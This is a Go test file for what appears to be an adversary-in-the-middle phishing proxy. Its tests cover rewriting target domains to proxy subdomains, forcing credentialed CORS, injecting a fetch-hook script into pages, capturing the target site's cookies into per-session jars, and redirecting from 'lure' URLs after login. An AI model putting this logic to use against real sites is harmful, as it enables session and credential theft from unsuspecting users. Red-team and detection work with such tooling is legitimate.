package main

import (
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"strings"
	"testing"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/session"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/valyala/fasthttp"
)

func TestResponseProcessorConvertCORS(t *testing.T) {
	tests := []struct {
		name   string
		origin string
	}{
		{
			name:   "WithProxyOrigin",
			origin: "https://www-google-com.example.com",
		},
		{
			name:   "WithTargetOrigin",
			origin: "https://www.google.com",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			proc := newResponseProcessor("example.com")
			req := &http.Request{}
			req.Header = make(http.Header)
			req.Header["Origin"] = []string{tt.origin}
			resp := &http.Response{
				Request: req,
				Header:  make(http.Header),
			}
			resp.Header["Access-Control-Allow-Origin"] = []string{"https://www.google.com"}
			proc.convertCORS(resp)
			origins := resp.Header["Access-Control-Allow-Origin"]
			require.Equal(t, "https://www-google-com.example.com", origins[0])
			require.Equal(t, "true", resp.Header["Access-Control-Allow-Credentials"][0])
		})
	}
}

func TestResponseProcessorConvertCORSWithStaticMapping(t *testing.T) {
	tests := []struct {
		name           string
		origin         string
		expectedOrigin string
	}{
		{
			name:           "WithProxyOrigin",
			origin:         "https://www-google-com.example.com",
			expectedOrigin: "https://www-google-com.example.com",
		},
		{
			name:           "WithStaticProxyOrigin",
			origin:         "https://static.google.com",
			expectedOrigin: "https://static.example.com",
		},

		{
			name:           "WithTargetOrigin",
			origin:         "https://www.google.com",
			expectedOrigin: "https://www-google-com.example.com",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			proc := newResponseProcessor("example.com")
			proc.conv.AddStaticMapping("static.example.com", "static.google.com")
			req := &http.Request{}
			req.Header = make(http.Header)
			req.Header["Origin"] = []string{tt.origin}
			resp := &http.Response{
				Request: req,
				Header:  make(http.Header),
			}
			resp.Header["Access-Control-Allow-Origin"] = []string{"https://www.google.com"}
			proc.convertCORS(resp)
			origins := resp.Header["Access-Control-Allow-Origin"]
			require.Equal(t, tt.expectedOrigin, origins[0])
			require.Equal(t, "true", resp.Header["Access-Control-Allow-Credentials"][0])
		})
	}
}

func TestResponseProcessorConvertCORSExposeHeaders(t *testing.T) {
	tests := []struct {
		name          string
		exposeHeaders string
		expected      string
	}{
		{
			name:     "EmptyExposeHeaders",
			expected: "X-Target-Url",
		},
		{
			name:          "WildcardExposeHeaders",
			exposeHeaders: "*",
			expected:      "*",
		},
		{
			name:          "NonEmptyExposeHeaders",
			exposeHeaders: "Auth-Token",
			expected:      "Auth-Token,X-Target-Url",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			proc := newResponseProcessor("example.com")
			req := &http.Request{}
			req.Header = make(http.Header)
			req.Header["Origin"] = []string{"https://www.google.com"}
			resp := &http.Response{
				Request: req,
				Header:  make(http.Header),
			}
			resp.Header["Access-Control-Allow-Origin"] = []string{"https://www.google.com"}
			if tt.exposeHeaders != "" {
				resp.Header["Access-Control-Expose-Headers"] = []string{tt.exposeHeaders}
			}
			proc.convertCORS(resp)

			origins := resp.Header["Access-Control-Allow-Origin"]
			require.Equal(t, "https://www-google-com.example.com", origins[0])
			require.Equal(t, "true", resp.Header["Access-Control-Allow-Credentials"][0])
			require.Equal(t, []string{tt.expected}, resp.Header["Access-Control-Expose-Headers"])
		})
	}
}

func TestResponseProcessorTargetRedirect(t *testing.T) {
	tests := []struct {
		name           string
		contentType    string
		isAuth         bool
		shouldRedirect bool
	}{
		{
			name:           "NotAuth",
			contentType:    "text/html",
			isAuth:         false,
			shouldRedirect: false,
		},
		{
			name:           "AuthJS",
			contentType:    "application/javascript",
			isAuth:         true,
			shouldRedirect: false,
		},
		{
			name:           "AuthHTML",
			contentType:    "text/html",
			isAuth:         true,
			shouldRedirect: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			mockAuth := authServiceFunc(func(*fiber.Ctx) bool {
				return tt.isAuth
			})
			proc := newResponseProcessor("example.com")
			proc.authService = mockAuth
			lureURL := "/lure/url"
			targetURL := "https://example.com/target/url"
			proc.lureService = &mockLureService{map[string]*APILure{
				lureURL: {LureURL: lureURL, TargetURL: targetURL},
			}}

			resp := &http.Response{
				Header: make(http.Header),
			}
			resp.Header.Set("Content-Type", tt.contentType)
			app := fiber.New()
			c := app.AcquireCtx(&fasthttp.RequestCtx{})
			defer app.ReleaseCtx(c)
			store := session.New()

			sm := NewSessionManager(store, sessionCookieName)
			sess, err := sm.NewSession(c, lureURL)
			require.NoError(t, err)
			setProxySession(c, sess)

			redirected := proc.targetRedirect(c, resp)
			require.Equal(t, tt.shouldRedirect, redirected)

			switch {
			case redirected:
				require.Equal(t, 302, c.Context().Response.StatusCode())
				require.Equal(t, targetURL, string(c.Context().Response.Header.Peek("Location")))
			case tt.isAuth:
				require.Equal(t, []string{targetURL}, resp.Header[HeaderTargetURL])
			default:
				require.Empty(t, resp.Header[HeaderTargetURL])
			}
		})
	}
}

func TestResponseProcessorConvertLocation(t *testing.T) {
	proc := newResponseProcessor("example.com")
	resp := &http.Response{
		Header: make(http.Header),
	}
	resp.Header["Location"] = []string{"https://www.google.com/abc"}
	resp.Header["Content-Location"] = []string{"https://www.google.com/doc.json"}
	proc.convertLocation(resp)
	locations := resp.Header["Location"]
	require.Equal(t, "https://www-google-com.example.com/abc", locations[0])
	locations = resp.Header["Content-Location"]
	require.Equal(t, "https://www-google-com.example.com/doc.json", locations[0])
}

func TestResponseProcessorConvertRelativeLocation(t *testing.T) {
	proc := newResponseProcessor("example.com")
	resp := &http.Response{
		Header: make(http.Header),
	}
	resp.Header["Location"] = []string{"/abc"}
	resp.Header["Content-Location"] = []string{"/doc.json"}
	proc.convertLocation(resp)
	locations := resp.Header["Location"]
	require.Equal(t, "/abc", locations[0])
	locations = resp.Header["Content-Location"]
	require.Equal(t, "/doc.json", locations[0])
}

func TestResponseProcessorConvertLocationWithStaticMapping(t *testing.T) {
	proc := newResponseProcessor("example.com")
	proc.conv.AddStaticMapping("www.example.com", "www.google.com")
	resp := &http.Response{
		Header: make(http.Header),
	}
	resp.Header["Location"] = []string{"https://www.google.com/abc"}
	resp.Header["Content-Location"] = []string{"https://www.google.com/doc.json"}
	proc.convertLocation(resp)
	locations := resp.Header["Location"]
	require.Equal(t, "https://www.example.com/abc", locations[0])
	locations = resp.Header["Content-Location"]
	require.Equal(t, "https://www.example.com/doc.json", locations[0])
}

func TestResponseProcessorWriteCookies(t *testing.T) {
	tests := []struct {
		name       string
		baseDomain string
		domain     string
	}{
		{
			name:       "simpleBaseDomain",
			baseDomain: "example.com",
			domain:     "www.google.com",
		},
		{
			name:       "baseDomainWithPort",
			baseDomain: "example.com:8091",
			domain:     "www.google.com",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			proc := newResponseProcessor(tt.baseDomain)
			req := &http.Request{}
			reqURL := &url.URL{Scheme: "https", Host: tt.domain}
			req.URL = reqURL
			resp := &http.Response{
				Request: req,
				Header:  make(http.Header),
			}

			resultCookie := &http.Cookie{
				Name:     "sessionID",
				Value:    "abc",
				Domain:   tt.domain,
				HttpOnly: true,
				SameSite: http.SameSiteStrictMode,
			}
			resp.Header.Add("Set-Cookie", resultCookie.String())

			app := fiber.New()
			c := app.AcquireCtx(&fasthttp.RequestCtx{})
			defer app.ReleaseCtx(c)
			sm := NewSessionManager(session.New(), sessionCookieName)
			sess, err := sm.NewSession(c, "/abc/def")
			require.NoError(t, err)
			setProxySession(c, sess)

			proc.writeCookies(c, resp)

			require.Zero(t, len(resp.Header["Set-Cookie"]))

			jarCookies := sess.CookieJar().Cookies(reqURL)
			require.Equal(t, []*http.Cookie{{Name: "sessionID", Value: "abc"}}, jarCookies)
		})
	}
}

func TestResponseProcessorWriteCookiesOptionsMethod(t *testing.T) {
	proc := newResponseProcessor("example.com")
	req := &http.Request{
		Method: http.MethodOptions,
		URL:    &url.URL{Scheme: "https", Host: "www.google.com"},
	}
	resp := &http.Response{
		Request: req,
	}

	app := fiber.New()
	c := app.AcquireCtx(&fasthttp.RequestCtx{})
	defer app.ReleaseCtx(c)

	proc.writeCookies(c, resp)

	c.Response().Header.VisitAllCookie(func(k, v []byte) {
		require.FailNow(t, "cookies are not expected")
	})
	require.Zero(t, len(resp.Header["Set-Cookie"]))
}

func TestResponseProcessorStatusCode(t *testing.T) {
	proc := newResponseProcessor("example.com")
	req := &http.Request{
		Method: http.MethodOptions,
		URL:    &url.URL{Scheme: "https", Host: "www.google.com"},
	}
	resp := &http.Response{
		Request:    req,
		Body:       io.NopCloser(strings.NewReader("")),
		StatusCode: 400,
	}

	app := fiber.New()
	c := app.AcquireCtx(&fasthttp.RequestCtx{})
	defer app.ReleaseCtx(c)

	proc.Process(c, resp)

	require.Equal(t, 400, c.Response().StatusCode())
}

func TestResponseProcessorWriteHeaders(t *testing.T) {
	proc := newResponseProcessor("example.com")
	resp := &http.Response{
		Header: make(http.Header),
	}
	resp.Header.Add("Content-Type", "application/javascript")
	resp.Header.Add("Content-Encoding", "gzip")

	app := fiber.New()
	c := app.AcquireCtx(&fasthttp.RequestCtx{})
	defer app.ReleaseCtx(c)
	proc.writeHeaders(c, resp)

	result := c.Response()
	require.Equal(t, "application/javascript", string(result.Header.Peek("Content-Type")))
	require.Equal(t, "gzip", string(result.Header.Peek("Content-Encoding")))
}

func TestResponseProcessorWriteBody(t *testing.T) {

	jsFile, err := os.ReadFile("js/fetch-hook.js")
	require.NoError(t, err)
	jsScript := "<script>" + string(jsFile) + "</script>"
	const bufSize = 4096

	tests := []struct {
		name        string
		contentType string
		input       string
		expected    string
	}{
		{
			name:        "HTMLwithoutURLs",
			contentType: "text/html",
			input: `
	<!DOCTYPE html>
	<html lang="en">
	  <head>
		<meta charset="utf-8">
	  </head>
	  <body>
	  	Hello!
	  </body>
	</html>
	`,
			expected: `
	<!DOCTYPE html>
	<html lang="en">
	  <head>` + jsScript + `
		<meta charset="utf-8">
	  </head>
	  <body>
	  	Hello!
	  </body>
	</html>
	`,
		},
		{
			name:        "HTMLwithURLs",
			contentType: "text/html",
			input: `
	<!DOCTYPE html>
	<html lang="en">
	  <head>
		<meta charset="utf-8">
	  <link rel="dns-prefetch" href="https://github.githubassets.com">
	  <link rel="dns-prefetch" href="http://avatars.githubusercontent.com">
	  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
	  <link rel="dns-prefetch" href="//user-images.githubusercontent.com/">
	  <link rel="mask-icon" href="https://github.githubassets.com/pinned-octocat.svg" color="#000000">
	  <link rel="shortcut icon" type="image/x-icon" href=//limg.test.com/re/i/meta/favicon.ico />
	  </head>
	  <body>
	  	Hello!
	  </body>
	</html>
	`,
			expected: `
	<!DOCTYPE html>
	<html lang="en">
	  <head>` + jsScript + `
		<meta charset="utf-8">
	  <link rel="dns-prefetch" href="https://github-githubassets-com.example.com">
	  <link rel="dns-prefetch" href="http://avatars-githubusercontent-com.example.com">
	  <link rel="dns-prefetch" href="https://github--cloud-s3-amazonaws-com.example.com">
	  <link rel="dns-prefetch" href="//user--images-githubusercontent-com.example.com/">
	  <link rel="mask-icon" href="https://github-githubassets-com.example.com/pinned-octocat.svg" color="#000000">
	  <link rel="shortcut icon" type="image/x-icon" href=//limg-test-com.example.com/re/i/meta/favicon.ico />
	  </head>
	  <body>
	  	Hello!
	  </body>
	</html>
	`,
		},
		{
			name:        "HTMLLargeBuffer",
			contentType: "text/html",
			input:       strings.Repeat(`<link rel="dns-prefetch" href="https://github.githubassets.com">`, 4096),
			expected:    strings.Repeat(`<link rel="dns-prefetch" href="https://github-githubassets-com.example.com">`, 4096),
		},
		{
			name:        "HTMLSplitTLD",
			contentType: "text/html",
			input:       strings.Repeat("a", bufSize-len("//bbc.ae")) + "//bbc.aero",
			expected:    strings.Repeat("a", bufSize-len("//bbc.ae")) + "//bbc-aero.example.com",
		},
		{
			name:        "HTMLSplitDomain",
			contentType: "text/html",
			input:       strings.Repeat("a", bufSize-len("//bb")) + "//bbc.com",
			expected:    strings.Repeat("a", bufSize-len("//bb")) + "//bbc-com.example.com",
		},
		{
			name:        "HTMLSplitDomainOnSlashes",
			contentType: "text/html",
			input:       strings.Repeat("a", bufSize-len("//")) + "//bbc.com",
			expected:    strings.Repeat("a", bufSize-len("//")) + "//bbc-com.example.com",
		},
		{
			name:        "HTMLSplitSlashes",
			contentType: "text/html",
			input:       strings.Repeat("a", bufSize-len("/")) + "//bbc.com",
			expected:    strings.Repeat("a", bufSize-len("/")) + "//bbc-com.example.com",
		},
		{
			name:        "HTMLwithBlockedTags",
			contentType: "text/html",
			input: `
	<!DOCTYPE html>
	<html lang="en">
	  <head>
		<meta charset="utf-8">
	  <link rel="dns-prefetch" href="https://github.githubassets.com" crossorigin="anonymous">
	  <link rel="dns-prefetch" href="http://avatars.githubusercontent.com" crossorigin="anonymous">
	  </head>
	  <body>
	  	Hello!
	  </body>
	</html>
	`,
			expected: `
	<!DOCTYPE html>
	<html lang="en">
	  <head>` + jsScript + `
		<meta charset="utf-8">
	  <link rel="dns-prefetch" href="https://github-githubassets-com.example.com" >
	  <link rel="dns-prefetch" href="http://avatars-githubusercontent-com.example.com" >
	  </head>
	  <body>
	  	Hello!
	  </body>
	</html>
	`,
		},
		{
			name:        "HTMLwithBlockedTagsWithCharset",
			contentType: `text/html; charset="utf-8"`,
			input: `
	<!DOCTYPE html>
	<html lang="en">
	  <head>
		<meta charset="utf-8">
	  <link rel="manifest" href="/manifest.json">
	  <link rel="dns-prefetch" href="https://github.githubassets.com" crossorigin="anonymous">
	  <link rel="dns-prefetch" href="http://avatars.githubusercontent.com" crossorigin="anonymous">
	  </head>
	  <body>
	  	Hello!
	  </body>
	</html>
	`,
			expected: `
	<!DOCTYPE html>
	<html lang="en">
	  <head>` + jsScript + `
		<meta charset="utf-8">
	  <link rel="manifest" crossorigin="use-credentials" href="/manifest.json">
	  <link rel="dns-prefetch" href="https://github-githubassets-com.example.com" >
	  <link rel="dns-prefetch" href="http://avatars-githubusercontent-com.example.com" >
	  </head>
	  <body>
	  	Hello!
	  </body>
	</html>
	`,
		},
		{
			name:        "Script",
			contentType: "application/javascript",
			input:       "console.log(`crossorigin=\"anonymous\"`)",
			expected:    "console.log(`crossorigin=\"anonymous\"`)",
		},
		{
			name:        "Image",
			contentType: "image/png",
			input:       "Qbzj7745QEXY@m",
			expected:    "Qbzj7745QEXY@m",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			proc := newResponseProcessor("example.com")
			w := httptest.NewRecorder()

			resp := &http.Response{
				Body:   io.NopCloser(strings.NewReader(tt.input)),
				Header: make(http.Header),
			}
			resp.Header["Content-Type"] = []string{tt.contentType}

			proc.writeBody(w, resp)
			result := w.Result()
			data, err := io.ReadAll(result.Body)
			require.NoError(t, err)
			assert.Equal(t, len(tt.expected), len(data))
			require.Equal(t, tt.expected, string(data))
		})
	}
}

func newResponseProcessor(domain string) *responseProcessor {
	conv := NewDomainConverter(domain)
	urlProc := newURLRegexProcessor(func(domain string) string {
		return conv.ToProxyDomain(domain)
	})
	htmlProc := newHTMLRegexProcessor(conv, fetchHookScript)
	authService := authServiceFunc(func(*fiber.Ctx) bool {
		return false
	})
	return NewResponseProcessor(conv, urlProc, htmlProc, NewCookieService(), authService, nil).(*responseProcessor)
}

type authServiceFunc func(c *fiber.Ctx) bool

func (f authServiceFunc) IsAuthenticated(c *fiber.Ctx) bool {
	return f(c)
}
